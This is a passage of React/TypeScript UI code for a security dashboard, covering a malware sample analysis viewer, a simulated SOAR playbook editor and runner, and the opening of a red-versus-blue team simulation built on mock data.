            id="malware-upload"
          />
          <label htmlFor="malware-upload" className="cursor-pointer">
            <FileSearch className="w-12 h-12 text-cyber-muted mx-auto mb-4" />
            <p className="text-white mb-2">Drop file here or click to upload</p>
            <p className="text-sm text-cyber-muted">Supports: EXE, DLL, PDF, DOC, ZIP (Max 50MB)</p>
          </label>
        </div>
        
        {isUploading && (
          <div className="mt-4">
            <div className="flex justify-between text-sm text-cyber-muted mb-1">
              <span>Uploading...</span>
              <span>{uploadProgress}%</span>
            </div>
            <div className="h-2 bg-cyber-gray rounded-full overflow-hidden">
              <div 
                className="h-full bg-cyber-lime rounded-full transition-all"
                style={{ width: `${uploadProgress}%` }}
              />
            </div>
          </div>
        )}
      </div>

      {/* Samples List */}
      <div className="cyber-card">
        <div className="p-4 border-b border-cyber-light">
          <h3 className="text-lg font-semibold text-white">Analysis History</h3>
        </div>
        <div className="p-4">
          <div className="space-y-3">
            {samples.map((sample) => (
              <div 
                key={sample.id} 
                onClick={() => setSelectedSample(sample)}
                className="p-4 bg-cyber-dark rounded-lg border border-cyber-light hover:border-cyber-lime cursor-pointer transition-colors"
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-4">
                    <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${
                      sample.verdict === 'malicious' ? 'bg-red-500/20' :
                      sample.verdict === 'suspicious' ? 'bg-orange-500/20' :
                      sample.verdict === 'clean' ? 'bg-green-500/20' :
                      'bg-cyber-gray'
                    }`}>
                      <FileCode className={`w-5 h-5 ${getVerdictColor(sample.verdict)}`} />
                    </div>
                    <div>
                      <div className="text-white font-medium">{sample.filename}</div>
                      <div className="text-sm text-cyber-muted">
                        {(sample.size / 1024).toFixed(1)} KB • {sample.fileType}
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center space-x-4">
                    {sample.status === 'analyzing' ? (
                      <span className="flex items-center space-x-2 text-yellow-500">
                        <RefreshCw className="w-4 h-4 animate-spin" />
                        <span>Analyzing...</span>
                      </span>
                    ) : (
                      <>
                        <div className="text-right">
                          <div className={`text-lg font-bold ${getVerdictColor(sample.verdict)}`}>
                            {sample.detections.filter(d => d.result !== 'Clean').length}/{sample.detections.length}
                          </div>
                          <div className="text-xs text-cyber-muted">Detections</div>
                        </div>
                        <div className={`text-lg font-bold ${getVerdictColor(sample.verdict)}`}>
                          {sample.verdict === 'malicious' ? 'MALICIOUS' : 
                           sample.verdict === 'suspicious' ? 'SUSPICIOUS' : 
                           sample.verdict === 'clean' ? 'CLEAN' : 'ANALYZING'}
                        </div>
                      </>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Sample Detail Modal */}
      {selectedSample && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-5xl max-h-[90vh] bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-cyber-light">
              <div>
                <h2 className="text-xl font-bold text-white">{selectedSample.filename}</h2>
                <p className="text-sm text-cyber-muted">
                  SHA256: {selectedSample.hash.sha256}
                </p>
              </div>
              <button onClick={() => setSelectedSample(null)} className="p-2 text-cyber-muted hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Tabs */}
            <div className="flex border-b border-cyber-light">
              {[
                { id: 'overview', label: 'Overview', icon: Eye },
                { id: 'static', label: 'Static Analysis', icon: FileSearch },
                { id: 'behavior', label: 'Behavior', icon: Activity },
                { id: 'yara', label: 'YARA Rules', icon: Scan }
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id as any)}
                  className={`flex items-center space-x-2 px-6 py-3 transition-colors ${
                    activeTab === tab.id 
                      ? 'text-cyber-lime border-b-2 border-cyber-lime' 
                      : 'text-cyber-muted hover:text-white'
                  }`}
                >
                  <tab.icon className="w-4 h-4" />
                  <span>{tab.label}</span>
                </button>
              ))}
            </div>

            <div className="p-6 overflow-y-auto max-h-[calc(90vh-180px)]">
              {activeTab === 'overview' && (
                <div className="space-y-6">
                  {/* Detection Summary */}
                  <div className="grid grid-cols-4 gap-4">
                    <div className="p-4 bg-cyber-gray rounded-lg text-center">
                      <div className="text-3xl font-bold text-red-500">
                        {selectedSample.detections.filter(d => d.result !== 'Clean').length}
                      </div>
                      <div className="text-sm text-cyber-muted">Detections</div>
                    </div>
                    <div className="p-4 bg-cyber-gray rounded-lg text-center">
                      <div className="text-3xl font-bold text-cyber-lime">
                        {selectedSample.entropy.toFixed(1)}
                      </div>
                      <div className="text-sm text-cyber-muted">Entropy</div>
                    </div>
                    <div className="p-4 bg-cyber-gray rounded-lg text-center">
                      <div className="text-3xl font-bold text-orange-500">
                        {selectedSample.staticAnalysis.suspiciousApis.length}
                      </div>
                      <div className="text-sm text-cyber-muted">Suspicious APIs</div>
                    </div>
                    <div className="p-4 bg-cyber-gray rounded-lg text-center">
                      <div className="text-3xl font-bold text-cyber-lime">
                        {selectedSample.confidence}%
                      </div>
                      <div className="text-sm text-cyber-muted">Confidence</div>
                    </div>
                  </div>

                  {/* Detection Engines */}
                  <div>
                    <h4 className="text-white font-medium mb-3">Detection Engines</h4>
                    <div className="grid grid-cols-2 gap-2">
                      {selectedSample.detections.map((detection, idx) => (
                        <div key={idx} className="flex items-center justify-between p-3 bg-cyber-gray rounded">
                          <span className="text-white">{detection.engine}</span>
                          <span className={`text-sm ${detection.result === 'Clean' ? 'text-green-500' : 'text-red-500'}`}>
                            {detection.result}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* File Hashes */}
                  <div>
                    <h4 className="text-white font-medium mb-3">File Hashes</h4>
                    <div className="space-y-2">
                      {[
                        { label: 'MD5', value: selectedSample.hash.md5 },
                        { label: 'SHA1', value: selectedSample.hash.sha1 },
                        { label: 'SHA256', value: selectedSample.hash.sha256 }
                      ].map((hash) => (
                        <div key={hash.label} className="flex items-center space-x-2 p-3 bg-cyber-gray rounded">
                          <span className="text-cyber-muted w-16">{hash.label}:</span>
                          <code className="flex-1 text-cyber-lime font-mono text-sm">{hash.value}</code>
                          <button 
                            onClick={() => navigator.clipboard.writeText(hash.value)}
                            className="p-1 text-cyber-muted hover:text-cyber-lime"
                          >
                            <Copy className="w-4 h-4" />
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'static' && (
                <div className="space-y-6">
                  {/* PE Sections */}
                  <div>
                    <h4 className="text-white font-medium mb-3">PE Sections</h4>
                    <div className="space-y-2">
                      {selectedSample.staticAnalysis.sections.map((section, idx) => (
                        <div key={idx} className="p-3 bg-cyber-gray rounded">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-white font-mono">{section.name}</span>
                            <span className={`text-sm ${section.entropy > 7 ? 'text-red-500' : 'text-cyber-lime'}`}>
                              Entropy: {section.entropy.toFixed(2)}
                            </span>
                          </div>
                          <div className="h-2 bg-cyber-dark rounded-full overflow-hidden">
                            <div 
                              className={`h-full rounded-full ${section.entropy > 7 ? 'bg-red-500' : 'bg-cyber-lime'}`}
                              style={{ width: `${(section.entropy / 8) * 100}%` }}
                            />
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Suspicious Strings */}
                  <div>
                    <h4 className="text-white font-medium mb-3">Suspicious Strings</h4>
                    <div className="bg-cyber-gray p-4 rounded-lg max-h-48 overflow-y-auto">
                      <pre className="text-sm text-cyber-lime font-mono">
                        {selectedSample.staticAnalysis.strings.join('\n')}
                      </pre>
                    </div>
                  </div>

                  {/* Suspicious APIs */}
                  <div>
                    <h4 className="text-white font-medium mb-3">Suspicious API Calls</h4>
                    <div className="flex flex-wrap gap-2">
                      {selectedSample.staticAnalysis.suspiciousApis.map((api, idx) => (
                        <span key={idx} className="px-3 py-1 bg-red-500/20 text-red-500 rounded text-sm">
                          {api}
                        </span>
                      ))}
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'behavior' && (
                <div className="space-y-6">
                  {/* File Operations */}
                  <div>
                    <h4 className="text-white font-medium mb-3">File Operations</h4>
                    <div className="space-y-2">
                      {selectedSample.behaviorAnalysis.fileOperations.map((op, idx) => (
                        <div key={idx} className="flex items-center space-x-3 p-3 bg-cyber-gray rounded">
                          <FileText className="w-4 h-4 text-cyber-lime" />
                          <span className="text-white text-sm">{op}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Network Connections */}
                  <div>
                    <h4 className="text-white font-medium mb-3">Network Connections</h4>
                    <div className="space-y-2">
                      {selectedSample.behaviorAnalysis.networkConnections.map((conn, idx) => (
                        <div key={idx} className="flex items-center space-x-3 p-3 bg-cyber-gray rounded">
                          <Network className="w-4 h-4 text-red-500" />
                          <span className="text-white text-sm font-mono">{conn}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Registry Operations */}
                  <div>
                    <h4 className="text-white font-medium mb-3">Registry Operations</h4>
                    <div className="space-y-2">
                      {selectedSample.behaviorAnalysis.registryOperations.map((reg, idx) => (
                        <div key={idx} className="flex items-center space-x-3 p-3 bg-cyber-gray rounded">
                          <Database className="w-4 h-4 text-orange-500" />
                          <span className="text-white text-sm font-mono">{reg}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'yara' && (
                <div className="space-y-6">
                  <div>
                    <h4 className="text-white font-medium mb-3">YARA Rule Matches</h4>
                    {selectedSample.yaraMatches.length === 0 ? (
                      <div className="text-center py-8 text-cyber-muted">
                        <CheckCircle className="w-12 h-12 mx-auto mb-4 text-green-500" />
                        <p>No YARA rules matched</p>
                      </div>
                    ) : (
                      <div className="space-y-2">
                        {selectedSample.yaraMatches.map((match, idx) => (
                          <div key={idx} className="p-4 bg-red-500/10 border border-red-500/30 rounded-lg">
                            <div className="flex items-center space-x-3">
                              <AlertTriangle className="w-5 h-5 text-red-500" />
                              <span className="text-white font-mono">{match}</span>
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
};

// ==================== COMPONENT: SOAR - AUTOMATED INCIDENT RESPONSE ====================

const SOARModule = () => {
  const [playbooks, setPlaybooks] = useState<Playbook[]>(mockPlaybooks);
  const [incidents, setIncidents] = useState<Incident[]>([]);
  const [selectedIncident, setSelectedIncident] = useState<Incident | null>(null);
  const [showPlaybookEditor, setShowPlaybookEditor] = useState(false);
  const [editingPlaybook, setEditingPlaybook] = useState<Playbook | null>(null);

  const executePlaybook = async (playbook: Playbook, incidentTitle: string) => {
    const incident: Incident = {
      id: Date.now().toString(),
      title: incidentTitle,
      severity: 'high',
      status: 'open',
      createdAt: new Date(),
      playbookId: playbook.id,
      affectedAssets: ['Web Server', 'Database'],
      indicators: ['185.220.101.42', 'suspicious.exe'],
      timeline: [{
        timestamp: new Date(),
        type: 'alert',
        description: `Incident triggered: ${incidentTitle}`
      }]
    };

    setIncidents([incident, ...incidents]);

    const execution: PlaybookExecution = {
      playbookId: playbook.id,
      startedAt: new Date(),
      status: 'running',
      actions: playbook.actions.map(a => ({
        actionId: a.id,
        type: a.type,
        status: 'pending'
      }))
    };

    setIncidents(prev => prev.map(i => 
      i.id === incident.id ? { ...i, playbookExecution: execution } : i
    ));

    // Execute actions sequentially
    for (let i = 0; i < playbook.actions.length; i++) {
      const action = playbook.actions[i];
      
      // Update to running
      setIncidents(prev => prev.map(inc => 
        inc.id === incident.id && inc.playbookExecution
          ? {
              ...inc,
              playbookExecution: {
                ...inc.playbookExecution,
                actions: inc.playbookExecution.actions.map((a, idx) =>
                  idx === i ? { ...a, status: 'running', startedAt: new Date() } : a
                )
              }
            }
          : inc
      ));

      // Simulate execution
      await new Promise(r => setTimeout(r, 1500));

      // Update to success
      setIncidents(prev => prev.map(inc => 
        inc.id === incident.id && inc.playbookExecution
          ? {
              ...inc,
              playbookExecution: {
                ...inc.playbookExecution,
                actions: inc.playbookExecution.actions.map((a, idx) =>
                  idx === i ? { 
                    ...a, 
                    status: 'success', 
                    completedAt: new Date(),
                    output: `${action.type} executed successfully`
                  } : a
                )
              },
              timeline: [
                ...inc.timeline,
                {
                  timestamp: new Date(),
                  type: 'action',
                  description: `Action executed: ${action.type}`,
                  actor: 'SOAR Automation'
                }
              ]
            }
          : inc
      ));
    }

    // Mark as completed
    setIncidents(prev => prev.map(inc => 
      inc.id === incident.id && inc.playbookExecution
        ? {
            ...inc,
            status: 'resolved',
            playbookExecution: {
              ...inc.playbookExecution,
              status: 'completed',
              completedAt: new Date()
            }
          }
        : inc
    ));

    setPlaybooks(prev => prev.map(p => 
      p.id === playbook.id 
        ? { ...p, executionCount: p.executionCount + 1, lastExecuted: new Date() }
        : p
    ));
  };

  const savePlaybook = (playbook: Playbook) => {
    if (editingPlaybook) {
      setPlaybooks(playbooks.map(p => p.id === playbook.id ? playbook : p));
    } else {
      setPlaybooks([...playbooks, { ...playbook, id: Date.now().toString(), executionCount: 0 }]);
    }
    setShowPlaybookEditor(false);
    setEditingPlaybook(null);
  };

  return (
    <div className="space-y-6">
      {/* Stats */}
      <div className="grid grid-cols-4 gap-4">
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-cyber-lime">{playbooks.length}</div>
          <div className="text-sm text-cyber-muted">Active Playbooks</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-orange-500">
            {incidents.filter(i => i.status === 'open' || i.status === 'in_progress').length}
          </div>
          <div className="text-sm text-cyber-muted">Open Incidents</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-green-500">
            {incidents.filter(i => i.status === 'resolved').length}
          </div>
          <div className="text-sm text-cyber-muted">Resolved</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-cyber-lime">
            {playbooks.reduce((acc, p) => acc + p.executionCount, 0)}
          </div>
          <div className="text-sm text-cyber-muted">Total Executions</div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Playbooks */}
        <div className="cyber-card">
          <div className="p-4 border-b border-cyber-light flex items-center justify-between">
            <h3 className="text-lg font-semibold text-white">Response Playbooks</h3>
            <button 
              onClick={() => { setEditingPlaybook(null); setShowPlaybookEditor(true); }}
              className="cyber-button text-sm flex items-center space-x-1"
            >
              <Plus className="w-4 h-4" />
              <span>Create</span>
            </button>
          </div>
          <div className="p-4">
            <div className="space-y-3">
              {playbooks.map((playbook) => (
                <div key={playbook.id} className="p-4 bg-cyber-dark rounded-lg border border-cyber-light">
                  <div className="flex items-start justify-between mb-2">
                    <div>
                      <h4 className="text-white font-medium">{playbook.name}</h4>
                      <p className="text-sm text-cyber-muted">{playbook.description}</p>
                    </div>
                    <div className="flex items-center space-x-2">
                      <div className={`w-2 h-2 rounded-full ${playbook.isActive ? 'bg-green-500' : 'bg-cyber-muted'}`} />
                      <button 
                        onClick={() => { setEditingPlaybook(playbook); setShowPlaybookEditor(true); }}
                        className="p-1 text-cyber-muted hover:text-cyber-lime"
                      >
                        <Settings className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                  <div className="flex items-center justify-between text-sm">
                    <span className="text-cyber-muted">
                      {playbook.actions.length} actions • {playbook.executionCount} executions
                    </span>
                    <button 
                      onClick={() => executePlaybook(playbook, `Test incident for ${playbook.name}`)}
                      className="text-cyber-lime hover:underline"
                    >
                      Test Run
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Incidents */}
        <div className="cyber-card">
          <div className="p-4 border-b border-cyber-light">
            <h3 className="text-lg font-semibold text-white">Recent Incidents</h3>
          </div>
          <div className="p-4">
            <div className="space-y-3 max-h-96 overflow-y-auto">
              {incidents.length === 0 ? (
                <div className="text-center py-8 text-cyber-muted">
                  <ShieldCheck className="w-12 h-12 mx-auto mb-4 opacity-50" />
                  <p>No incidents yet</p>
                </div>
              ) : (
                incidents.map((incident) => (
                  <div 
                    key={incident.id} 
                    onClick={() => setSelectedIncident(incident)}
                    className="p-4 bg-cyber-dark rounded-lg border border-cyber-light hover:border-cyber-lime cursor-pointer transition-colors"
                  >
                    <div className="flex items-start justify-between mb-2">
                      <h4 className="text-white font-medium">{incident.title}</h4>
                      <span className={`text-xs px-2 py-1 rounded ${
                        incident.status === 'open' ? 'bg-red-500/20 text-red-500' :
                        incident.status === 'in_progress' ? 'bg-yellow-500/20 text-yellow-500' :
                        incident.status === 'resolved' ? 'bg-green-500/20 text-green-500' :
                        'bg-cyber-muted/20 text-cyber-muted'
                      }`}>
                        {incident.status.replace('_', ' ').toUpperCase()}
                      </span>
                    </div>
                    <div className="flex items-center space-x-4 text-sm text-cyber-muted">
                      <span>{incident.createdAt.toLocaleTimeString()}</span>
                      {incident.playbookExecution && (
                        <span className="flex items-center space-x-1">
                          <RefreshCw className={`w-3 h-3 ${incident.playbookExecution.status === 'running' ? 'animate-spin' : ''}`} />
                          <span>
                            {incident.playbookExecution.actions.filter(a => a.status === 'success').length}/{incident.playbookExecution.actions.length} actions
                          </span>
                        </span>
                      )}
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Playbook Editor Modal */}
      {showPlaybookEditor && (
        <PlaybookEditorModal
          isOpen={showPlaybookEditor}
          onClose={() => { setShowPlaybookEditor(false); setEditingPlaybook(null); }}
          playbook={editingPlaybook}
          onSave={savePlaybook}
        />
      )}

      {/* Incident Detail Modal */}
      {selectedIncident && (
        <IncidentDetailModal
          incident={selectedIncident}
          onClose={() => setSelectedIncident(null)}
        />
      )}
    </div>
  );
};

// Playbook Editor Modal
const PlaybookEditorModal = ({ isOpen, onClose, playbook, onSave }: {
  isOpen: boolean;
  onClose: () => void;
  playbook: Playbook | null;
  onSave: (p: Playbook) => void;
}) => {
  const [formData, setFormData] = useState<Partial<Playbook>>(playbook || {
    name: '',
    description: '',
    trigger: { type: 'manual' },
    actions: [],
    isActive: true
  });
  const [newAction, setNewAction] = useState<Partial<PlaybookAction>>({ type: 'send_email', config: {} });

  if (!isOpen) return null;

  const addAction = () => {
    if (!newAction.type) return;
    setFormData({
      ...formData,
      actions: [...(formData.actions || []), { ...newAction, id: Date.now().toString() } as PlaybookAction]
    });
    setNewAction({ type: 'send_email', config: {} });
  };

  const removeAction = (id: string) => {
    setFormData({
      ...formData,
      actions: formData.actions?.filter(a => a.id !== id) || []
    });
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        className="w-full max-w-2xl max-h-[90vh] bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
      >
        <div className="flex items-center justify-between p-4 border-b border-cyber-light">
          <h2 className="text-xl font-bold text-white">{playbook ? 'Edit' : 'Create'} Playbook</h2>
          <button onClick={onClose} className="p-2 text-cyber-muted hover:text-white">
            <X className="w-5 h-5" />
          </button>
        </div>

        <div className="p-6 overflow-y-auto max-h-[calc(90vh-140px)]">
          <div className="space-y-4">
            <div>
              <label className="block text-sm text-cyber-muted mb-1">Name</label>
              <input
                type="text"
                value={formData.name}
                onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                className="cyber-input w-full"
              />
            </div>
            <div>
              <label className="block text-sm text-cyber-muted mb-1">Description</label>
              <textarea
                value={formData.description}
                onChange={(e) => setFormData({ ...formData, description: e.target.value })}
                className="cyber-input w-full h-20 resize-none"
              />
            </div>
            <div>
              <label className="block text-sm text-cyber-muted mb-1">Trigger</label>
              <select
                value={formData.trigger?.type}
                onChange={(e) => setFormData({ ...formData, trigger: { ...formData.trigger, type: e.target.value as any } })}
                className="cyber-input w-full"
              >
                <option value="manual">Manual</option>
                <option value="alert">On Alert</option>
                <option value="schedule">Scheduled</option>
              </select>
            </div>

            {/* Actions */}
            <div>
              <label className="block text-sm text-cyber-muted mb-2">Actions</label>
              <div className="space-y-2 mb-4">
                {formData.actions?.map((action, idx) => (
                  <div key={action.id} className="flex items-center justify-between p-3 bg-cyber-gray rounded">
                    <div className="flex items-center space-x-3">
                      <span className="text-cyber-lime">{idx + 1}.</span>
                      <span className="text-white capitalize">{action.type.replace('_', ' ')}</span>
                    </div>
                    <button 
                      onClick={() => removeAction(action.id)}
                      className="p-1 text-red-500 hover:bg-red-500/10 rounded"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                ))}
              </div>

              <div className="flex space-x-2">
                <select
                  value={newAction.type}
                  onChange={(e) => setNewAction({ ...newAction, type: e.target.value as any })}
                  className="cyber-input flex-1"
                >
                  <option value="block_ip">Block IP</option>
                  <option value="disable_user">Disable User</option>
                  <option value="isolate_host">Isolate Host</option>
                  <option value="send_email">Send Email</option>
                  <option value="send_slack">Send Slack</option>
                  <option value="create_ticket">Create Ticket</option>
                  <option value="webhook">Webhook</option>
                </select>
                <button onClick={addAction} className="cyber-button">
                  <Plus className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        </div>

        <div className="flex items-center justify-end space-x-3 p-4 border-t border-cyber-light">
          <button onClick={onClose} className="cyber-button-outline">Cancel</button>
          <button 
            onClick={() => onSave(formData as Playbook)} 
            className="cyber-button"
          >
            Save Playbook
          </button>
        </div>
      </motion.div>
    </div>
  );
};

// Incident Detail Modal
const IncidentDetailModal = ({ incident, onClose }: {
  incident: Incident;
  onClose: () => void;
}) => {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        className="w-full max-w-3xl max-h-[90vh] bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
      >
        <div className="flex items-center justify-between p-4 border-b border-cyber-light">
          <div>
            <h2 className="text-xl font-bold text-white">{incident.title}</h2>
            <p className="text-sm text-cyber-muted">ID: {incident.id}</p>
          </div>
          <button onClick={onClose} className="p-2 text-cyber-muted hover:text-white">
            <X className="w-5 h-5" />
          </button>
        </div>

        <div className="p-6 overflow-y-auto max-h-[calc(90vh-140px)]">
          <div className="grid grid-cols-2 gap-4 mb-6">
            <div className="p-4 bg-cyber-gray rounded-lg">
              <div className="text-sm text-cyber-muted mb-1">Status</div>
              <span className={`text-lg font-medium ${
                incident.status === 'open' ? 'text-red-500' :
                incident.status === 'in_progress' ? 'text-yellow-500' :
                incident.status === 'resolved' ? 'text-green-500' :
                'text-cyber-muted'
              }`}>
                {incident.status.replace('_', ' ').toUpperCase()}
              </span>
            </div>
            <div className="p-4 bg-cyber-gray rounded-lg">
              <div className="text-sm text-cyber-muted mb-1">Created</div>
              <span className="text-white">{incident.createdAt.toLocaleString()}</span>
            </div>
          </div>

          {/* Affected Assets */}
          <div className="mb-6">
            <h4 className="text-white font-medium mb-2">Affected Assets</h4>
            <div className="flex flex-wrap gap-2">
              {incident.affectedAssets.map((asset, idx) => (
                <span key={idx} className="px-3 py-1 bg-cyber-lime/20 text-cyber-lime rounded text-sm">
                  {asset}
                </span>
              ))}
            </div>
          </div>

          {/* Indicators */}
          <div className="mb-6">
            <h4 className="text-white font-medium mb-2">Indicators of Compromise</h4>
            <div className="flex flex-wrap gap-2">
              {incident.indicators.map((ioc, idx) => (
                <span key={idx} className="px-3 py-1 bg-red-500/20 text-red-500 rounded text-sm font-mono">
                  {ioc}
                </span>
              ))}
            </div>
          </div>

          {/* Playbook Execution */}
          {incident.playbookExecution && (
            <div className="mb-6">
              <h4 className="text-white font-medium mb-2">Playbook Execution</h4>
              <div className="space-y-2">
                {incident.playbookExecution.actions.map((action, idx) => (
                  <div key={idx} className="flex items-center space-x-3 p-3 bg-cyber-gray rounded">
                    {action.status === 'success' ? (
                      <CheckCircle className="w-5 h-5 text-green-500" />
                    ) : action.status === 'running' ? (
                      <RefreshCw className="w-5 h-5 text-yellow-500 animate-spin" />
                    ) : action.status === 'failed' ? (
                      <XCircle className="w-5 h-5 text-red-500" />
                    ) : (
                      <Clock className="w-5 h-5 text-cyber-muted" />
                    )}
                    <span className="text-white capitalize">{action.type.replace('_', ' ')}</span>
                    <span className={`text-sm ml-auto ${
                      action.status === 'success' ? 'text-green-500' :
                      action.status === 'running' ? 'text-yellow-500' :
                      action.status === 'failed' ? 'text-red-500' :
                      'text-cyber-muted'
                    }`}>
                      {action.status.toUpperCase()}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Timeline */}
          <div>
            <h4 className="text-white font-medium mb-2">Timeline</h4>
            <div className="space-y-3">
              {incident.timeline.map((event, idx) => (
                <div key={idx} className="flex items-start space-x-3">
                  <div className="w-2 h-2 rounded-full bg-cyber-lime mt-2" />
                  <div>
                    <div className="text-white">{event.description}</div>
                    <div className="text-sm text-cyber-muted">
                      {event.timestamp.toLocaleTimeString()}
                      {event.actor && ` • ${event.actor}`}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </motion.div>
    </div>
  );
};

// ==================== COMPONENT: RED TEAM VS BLUE TEAM SIMULATION ====================

const RedTeamBlueTeamSimulation = () => {
  const [activeScenario, setActiveScenario] = useState<AttackScenario | null>(null);
  const [simulation, setSimulation] = useState<SimulationSession | null>(null);
  const [scenarios] = useState<AttackScenario[]>(mockAttackScenarios);
  const [viewMode, setViewMode] = useState<'red' | 'blue'>('red');

  const startSimulation = (scenario: AttackScenario) => {
    const newSimulation: SimulationSession = {
      id: Date.now().toString(),
      scenarioId: scenario.id,
      status: 'running',
      startTime: new Date(),
      redTeamScore: 0,
      blueTeamScore: 0,
      events: [],
      currentPhase: 0
    };
    setActiveScenario(scenario);
    setSimulation(newSimulation);

    // Simulate attack events
    simulateAttack(scenario, newSimulation);
  };

  const simulateAttack = async (scenario: AttackScenario, _sim: SimulationSession) => {
    const events: SimulationEvent[] = [];

    for (const tactic of scenario.tactics) {
      // Red team attack
      await new Promise(r => setTimeout(r, 2000));
      const attackEvent: SimulationEvent = {
        timestamp: new Date(),
        team: 'red',
        type: 'attack',
        description: `Executing: ${tactic.procedure}`,
        points: 10,
        technique: tactic.technique
      };
      events.push(attackEvent);
      setSimulation(prev => prev ? { 
        ...prev, 
        events: [...prev.events, attackEvent],
        redTeamScore: prev.redTeamScore + 10
      } : null);

      // Blue team detection
      await new Promise(r => setTimeout(r, 1500));
      const detectionEvent: SimulationEvent = {
        timestamp: new Date(),
        team: 'blue',
        type: 'detection',
        description: `Detected: ${tactic.detection}`,
        points: 15,
        technique: tactic.technique
      };
      events.push(detectionEvent);
      setSimulation(prev => prev ? { 
        ...prev, 
        events: [...prev.events, detectionEvent],
        blueTeamScore: prev.blueTeamScore + 15
      } : null);

      // Blue team mitigation
      await new Promise(r => setTimeout(r, 1000));
      const mitigationEvent: SimulationEvent = {
        timestamp: new Date(),
        team: 'blue',
        type: 'mitigation',
        description: `Applied: ${tactic.mitigation}`,
        points: 20,
        technique: tactic.technique
      };
      events.push(mitigationEvent);
      setSimulation(prev => prev ? { 
        ...prev, 
        events: [...prev.events, mitigationEvent],
        blueTeamScore: prev.blueTeamScore + 20
      } : null);
    }

    // Complete simulation
    setSimulation(prev => prev ? { 
      ...prev, 
      status: 'completed',
      endTime: new Date()
    } : null);
  };

  const stopSimulation = () => {
    setSimulation(prev => prev ? { ...prev, status: 'completed', endTime: new Date() } : null);
  };

  return (
    <div className="space-y-6">
      {!simulation ? (
        <>
          {/* Scenario Selection */}
          <div className="cyber-card p-6">
            <h3 className="text-lg font-semibold text-white mb-4 flex items-center space-x-2">
              <Sword className="w-5 h-5 text-red-500" />
              <span>Red Team Scenarios</span>
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {scenarios.map((scenario) => (
                <div 
                  key={scenario.id} 
                  className="p-4 bg-cyber-dark rounded-lg border border-cyber-light hover:border-red-500 transition-colors cursor-pointer"
                  onClick={() => startSimulation(scenario)}
                >
                  <div className="flex items-center justify-between mb-3">
                    <span className={`text-xs px-2 py-1 rounded ${
                      scenario.difficulty === 'easy' ? 'bg-green-500/20 text-green-500' :
                      scenario.difficulty === 'medium' ? 'bg-yellow-500/20 text-yellow-500' :
                      'bg-red-500/20 text-red-500'
                    }`}>
                      {scenario.difficulty.toUpperCase()}
                    </span>
                    <Clock className="w-4 h-4 text-cyber-muted" />
                    <span className="text-sm text-cyber-muted">{scenario.estimatedDuration} min</span>
                  </div>
                  <h4 className="text-white font-medium mb-2">{scenario.name}</h4>
                  <p className="text-sm text-cyber-muted mb-3">{scenario.description}</p>
                  <div className="flex items-center space-x-2">
                    <Target className="w-4 h-4 text-cyber-lime" />
                    <span className="text-sm text-cyber-lime">{scenario.tactics.length} tactics</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Instructions */}
          <div className="grid grid-cols-2 gap-6">
            <div className="cyber-card p-6 border-red-500/30">
              <div className="flex items-center space-x-3 mb-4">
                <div className="w-10 h-10 rounded-lg bg-red-500/20 flex items-center justify-center">
                  <Sword className="w-5 h-5 text-red-500" />
                </div>
                <div>
                  <h4 className="text-white font-medium">Red Team</h4>
                  <p className="text-sm text-cyber-muted">Attack & Exploit</p>
                </div>
              </div>
              <ul className="space-y-2 text-sm text-cyber-muted">
                <li className="flex items-center space-x-2">
                  <ChevronRight className="w-4 h-4 text-red-500" />
                  <span>Execute attack techniques</span>
                </li>
                <li className="flex items-center space-x-2">
                  <ChevronRight className="w-4 h-4 text-red-500" />
                  <span>Evade detection</span>
                </li>
                <li className="flex items-center space-x-2">
                  <ChevronRight className="w-4 h-4 text-red-500" />
                  <span>Achieve objectives</span>
